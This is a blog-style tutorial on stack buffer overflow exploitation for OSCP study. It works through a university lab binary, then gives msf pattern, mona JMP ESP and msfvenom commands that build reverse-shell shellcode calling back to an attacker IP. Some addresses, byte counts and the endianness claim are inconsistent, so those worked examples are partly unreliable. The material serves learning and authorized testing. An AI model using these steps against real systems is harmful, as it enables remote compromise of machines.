<!DOCTYPE html>
<html>
<head>
    <title>Buffer Overflows - Braindead Overview</title> 
    <meta name="description" content="A braindead pentester's guide to exploitation and easy points on the OSCP">
    <meta name="author" content="kogatana-x">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv='content-language' content='en-us'> 
    <meta name="keywords" content="kogatana-x, offensive security, defensive security, sysadmin, programming">
    
    <meta property="og:title" content="Buffer Overflows - Braindead Overview">
    <meta name="category" content="offensive">


    <link rel="icon" href="https://kogatana-x.github.io/images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css">
    <link rel="stylesheet" href="https://kogatana-x.github.io/kogatana-x.css">

    <script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/highlight.min.js"></script>
    <script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/javascript.min.js"></script>
</head>
<body>

    <div class="navbar">
        <a href="https://kogatana-x.github.io/">
            <img src="../images/22989723.png" alt="Profile"> 
        </a>
        <h2>kogatana-x</h2>
        <p>Offensive//Defensive Security</p>
        <div class="social">
            <a href="https://github.com/kogatana-x" target="_blank" rel="noreferrer noopener">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ee4c4f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
                    <title>Github</title>
                    <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
                </svg>
            </a>
            <a href="https://www.linkedin.com/in/anna-andler" target="_blank" rel="noreferrer noopener">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ee4c4f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
                    <title>LinkedIn</title>
                    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
                </svg>
            </a>
        </div>
    </div>

    <div class="content">
        <div class="banner">
            <pre>

██╗  ██╗ ██████╗  ██████╗  █████╗ ████████╗ █████╗ ███╗   ██╗ █████╗      ██╗  ██╗
██║ ██╔╝██╔═══██╗██╔════╝ ██╔══██╗╚══██╔══╝██╔══██╗████╗  ██║██╔══██╗     ╚██╗██╔╝
█████╔╝ ██║   ██║██║  ███╗███████║   ██║   ███████║██╔██╗ ██║███████║█████╗╚███╔╝ 
██╔═██╗ ██║   ██║██║   ██║██╔══██║   ██║   ██╔══██║██║╚██╗██║██╔══██║╚════╝██╔██╗ 
██║  ██╗╚██████╔╝╚██████╔╝██║  ██║   ██║   ██║  ██║██║ ╚████║██║  ██║     ██╔╝ ██╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝     ╚═╝  ╚═╝                                                                                 

──────────────────────────────────────────────────────────────────────────────────
            </pre>
        </div>       
        <div class="blog-post">   
            <h1>Buffer Overflows - Braindead Overview</h1> 
            <time datetime="2024-04-17T11:58:56">April 17th, 2024</time>
            <pre>
──────────────────────────────────────────────────────────────────────────────────

            </pre>
            <h2>Introduction</h2>
                <p>Buffer Overflows nowadays seem more like a mysterious witchcraft exploit, than a simple entryway into binary exploitation. In this post, I want to demystify how to perform a buffer overflow attack thats easy enough for the most braindead students to understand. </p>
                <p>There are six general steps that you can take to perform this attack, and we will go over them in depth in the subsequent post. </p>
                <ol>
                    <li>Crash the Application / Trigger the BoF</li>
                    <li>Find and confirm the Extended Intruction Pointer (EIP) offset to control it </li>
                    <li>Find and confirm the "badchars" / bad characters</li>
                    <li>Find and confirm the return address (JMP ESP Instruction)</li>
                    <li>Generate the shellcode to exploit the BoF</li>
                    <li>Exploit the BoF</li>
                </ol>
                <p>There are scripts and tools out there that can be used to automate, or partially automate this process, but for the sake of learning and understanding, we will be doing this mostly manually with gdb in a linux install.</p>
        <img src="https://kogatana-x.github.io/images/Buffer-Overflow/Picture0.png" alt="bof0">
            <pre>
──────────────────────────────────────────────────────────────────────────────────

            </pre>       
        <h2>Lets Get Exploiting</h2>    
            <p>In the OSCP, usually, you are given an application to start with. In this example, we will be going through a binary vulnerable to BoF, "ctarget" that I originally used in my Systems I class at university. "ctarget" is a program that is vulnerable to code-injection attacks. 
            We know that ctarget reads strings from standard input via the getbuf function</p>
            <pre><code>unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}</code></pre>            
            <h3>Phase 1 - Basic BoF</h3>
            <p>Summary: Get the size of the buffer, fill the buffer with padding, then point the buffer to the address of the function we want to call</p>
            <p>For this first phase, we are going to try to get the application to crash by overflowing the stack, but not inject any new code. Specifically, we are going to overflow the stack and change the return address of the function to a different function. In my application, this would be the getbuf function's return address to point to the address of the touch1 function to get a feel for how to do these attacks. 
            To call the touch1 function, first run the ctarget executable in gdb, and set a breakpoint at the getbuf function.</p>
            <pre><code>b get buf</code></pre>
            <p>To disassemble the getbuf function and get the buffer size, we can use the disas command:</p>
            <pre><code>disas getbuf</code></pre>
            <p>We can then take the buffer size and use it to fill the amount of space we need to force the application to return the touch1 function.</p>
            <img style="width: 50%;" src="https://kogatana-x.github.io/images/Buffer-Overflow/Picture1.png" alt="bof1">
            <p>If we take a look at the first line, sub $0x28,%rsp, we can see that the buffer size is 0x28, or 40 bytes.
            To find the address the touch1, you need to get the dissasembled code for ctarget executable.</p>
            <pre><code>objdump -d ctarget > ctarget_dump.txt</code></pre>
            <p>Then, you can search for the touch1 function in the dump file, my touch1 function was at 0x4c1840, youll know as it looks something like this</p>
            <pre><code>0000000000401760 <touch1>:</code></pre>
            <p>Now we can use this information to craft our exploit string. When you write the bytes, you need to consider the byte order. My system is a big-endian so the bytes go in order. I put the following into a file called 'phase1.txt'</p> 
            <pre><code>00 00 00 00 00 00 00 00 00   /* buffer - 40 bytes*/
                00 00 00 00 00 00 00 00 00
                00 00 00 00 00 00 00 00 00
                00 00 00 00 00 00 00 00 00
                00 00 00 00 00 00 00 00 00
                4c 18 40 00 00 00 00 00 00   /*overflow w/ address bwhahah*/</code></pre>
            <p>So that the program understands my BoF string, I ran the text file I made, phase1.txt in hex2raw and generated a raw exploit string.</p>
            <pre><code>./hex2raw < phase1.txt > raw-phase1.txt</code></pre>
            <p>With all of these pieces, I ran the exploit string against the target binary, ctarget</p>
            <pre><code>./ctarget < raw-phase1.txt</code></pre> 
            <p>And the application should crash and return the touch1 function!</p>           
            <pre>
──────────────────────────────────────────────────────────────────────────────────

            </pre>    
            <h3>Phase 2 - A little bit harder! Code Injection! </h3>
            <p>Summary: Get the buffer size, get the return address of touch2, modify the %rdi register and store our cookie in it.</p>
            <p>In phase 2, we are going to be doing basically the same thing as phase 1, but this time we'll inject a small bit of code to make it look like we are passing a cookie as an argument to the second function, touch2.
            First, we need to find the address of the touch2 function. We can do this by disassembling the ctarget executable and searching for the touch2 function, much like we did in Phase 1.
            The address of my touch2 is 0x401878. However, this time we also need the address of the cookie we are passing to touch2. With a bit more searching, I found my cookieaddr is 0x10ee1fdf
            Now we can craft our exploit string. I put the following into a file called 'phase2.s'</p>
            <pre><code>movq $0x10ee1fdf, %rdi
                retq</code></pre>
            <p>Similar to last time, so that the application understands the exploit string, I converted the above assembly into byte code:</p>
            <pre><code>.gcc -c phase2.s
                objdump -d phase2.o  > phase2.d </code></pre>
            <p>The byte code I generated was </p>
            <pre><code>48 c7 c7 df 1f ee 10
c3</code></pre>
            <p>Next objective on the dock for this exploit is to get the rsp address in touch 2. In order to do this, I ran the code just until the Gets call.</p>
            <img style="width: 50%;" src="https://kogatana-x.github.io/images/Buffer-Overflow/Picture2.png" alt="bof2">
            <pre><code>until *0x401838</code></pre>
            <p>My application prompted me to type a string, so I inputted 40bytes worth of characters, then I executed: </p>
            <pre><code>x/s $rsp</code></pre>
            <p>Whatever address is returned first is the rsp bytes. In my case this was 0x55656ef8
            We finally have everything we need to make our exploit code! I made a text file called phase2.txt, buildingn off of what we found in Phase1 and in this phase.</p>
            <pre><code>48 c7 c7 70 4b 4b 43 c3 00 /*cookie*/
                00 00 00 00 00 00 00 00 00 /* 40 bytes of padding*/
                00 00 00 00 00 00 00 00 00
                00 00 00 00 00 00 00 00 00
                00 00 00 00 00 00 00 00 00
                55 65 6e f8 00 00 00 00 00 /* rsp address */
                40 18 78 00 00 00 00 00 00 /* touch2 address */</code></pre>
            <p>So that the application understands the exploit string, I ran the text file I made, phase2.txt in hex2raw and generated a raw exploit string.</p>
            <pre><code>./hex2raw < phase2.txt > raw-phase2.txt</code></pre>
            <p>With all of these pieces, I ran the exploit string against the target binary, ctarget</p>
            <pre><code>./ctarget < raw-phase2.txt</code></pre>
            <p>And the application should crash and return the touch2 function!
            That's it! You've successfully exploited a buffer overflow! </p>
            <pre>
──────────────────────────────────────────────────────────────────────────────────

            </pre>      
            <h3>Phase 3 - Taking it a step further</h3>
            <p>For doing BoF attacks for something such as the OSCP, we can take everything a step further and begin automating our processes, and even create shell code to get a reverse shell and easy command execution on the target.</p>
                <h4>Step 1- Fuzzing</h4>
                <p>Like we demonstrated earlier, we need to send enough data at once to the target to trigger the overflow and crash the application. We can use fuzzing to our advantage, by sending increasing payloads with different characters within a debugger
                Tools we can use to monitor the target include Immunity Debugger, Ollydbg, WinDbg, and GDB.
                And to Fuzz the target we can use a script such as this one: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/fuzzer.py">Fuzzer.py</a></p>
            
                <h4>Step 2 - Finding the Offset</h4>
                <p>Once we have crashed the application, we need to find the offset of the EIP. We can do this by sending a unique string of characters to the target and monitoring the EIP register in the debugger.
                We can even change the payload to a unique string so that when the target crashes, EIP will hold an offest that tells us how much data is needed to overwrite EIP
                To generate this unique string of the Buffer that we found in step 1, we can use msf-pattern_create, and <a href="https://github.com/spaceyowie/oscp-bof/blob/main/eip_offset.py">EIP_Offset.py</a></p>
                <pre><code>msf-pattern_create -l $buffer_size</code></pre>
                <p>Then we can send this string to the target and monitor the EIP register</p>
                <pre><code>msf-pattern_offset -l $buffer_size -q $EIP</code></pre>
                <p>And we will get the offset of the EIP
                We can make a PoC with something such as this script: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/eip_control.py">EIP_Control.py</a></p>
        
                <h4>Step 3 - Evaluating Shellcode Payload Space</h4>
                <p>Now that we know the offset of the EIP, we can begin to evaluate the space we have to work with for our shellcode. 
                Depending on the shellcode you intend to use, around 500 bytes of room is required.
                The space can be identifyed by sending the amount of bytes you need after the initial overflow
                And we can use a script such as this one to generate the space: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/shellcode_space.py">Shellcode_Space.py</a></p>

                <h4>Step 4 - Finding Bad Characters</h4>
                <p>Bad characters are characters that can break the shellcode. We need to identify these characters and avoid them in our shellcode.
                We can use a script such as this one to identify bad characters: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/badchars_check.py">Badchars_Check.py</a></p>

                <h4>Step 5 - Finding the Return Address</h4>
                <p>After identifying bad characters, we need to locate a reliable **JMP ESP** instruction. If **EIP** can be redirected to this instruction, and **ESP** points to the start of our shellcode, our shellcode will execute.</p>
                <ol>
                    <li>In Immunity Debugger, use **mona** to find a **JMP ESP** pointer that avoids bad characters: 
                        <pre><code>!mona jmp -r esp -cpb "\x00"</code></pre>
                    </li>
                    <li>Additionally, use **mona** to list modules used by the target and identify unprotected modules: 
                        <pre><code>!mona modules</code></pre>
                    </li>
                    <li>Once an unprotected module is found, use **mona** to locate a **JMP ESP** pointer (opcode `\xff\xe4`) within the module: 
                        <pre><code>!mona find -s "\xff\xe4" -m "<name of module>"</code></pre>
                    </li>
                    <li>Be sure to record the address of the pointer when found.</li>
                </ol>

                <h4>Step 6 - Generating Shellcode</h4>
                <p>With the **JMP ESP** pointer identified, we can generate shellcode using **msfvenom**. The shellcode should be encoded to avoid bad characters.</p>
                <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -b "<bad characters>" -f python</code></pre>
                <p>Be sure to replace `<attacker IP>` and `<attacker port>` with the IP address and port of the attacking machine, and `<bad characters>` with any identified bad characters.
                Additionally, the shellcode should be encoded using the **x86/shikata_ga_nai** encoder to avoid bad characters: </p>
                    <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -b "<bad characters>" -f python -e x86/shikata_ga_nai</code></pre>
                <p>Finally, the shellcode should be formatted to be used in the exploit script.
                And we can use a script such as this one to generate the exploit: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/exploit.py">Exploit.py</a></p>
            <pre>
──────────────────────────────────────────────────────────────────────────────────

            </pre>            
            <h2>Conclusion</h2>
            <p>Buffer Overflows are a powerful tool in the arsenal of a pentester, and can be used to exploit a wide variety of applications. By following the steps outlined in this post, you can begin to understand how to perform a buffer overflow attack and exploit vulnerable applications. 
            Remember, always ensure you have permission to perform a buffer overflow attack on a target, and never use this knowledge for malicious purposes. 
            Happy Hacking!
            If you want to learn more about buffer over flow attacks, or are still confused, check out this guide! <a href="https://lightfootlabs.io/resources/Learn-Buffer-Overflows-through-Visuals">Visual BoF</a></p>
        
            </div>
    </div>
    <div class="footer">
        <p>© 2021 kogatana-x</p>
    </div>
</body>
<script>
    document.addEventListener('DOMContentLoaded', (event) => {
  document.querySelectorAll('pre code').forEach((block) => {
    hljs.highlightElement(block);
  });
});
</script>
</html>
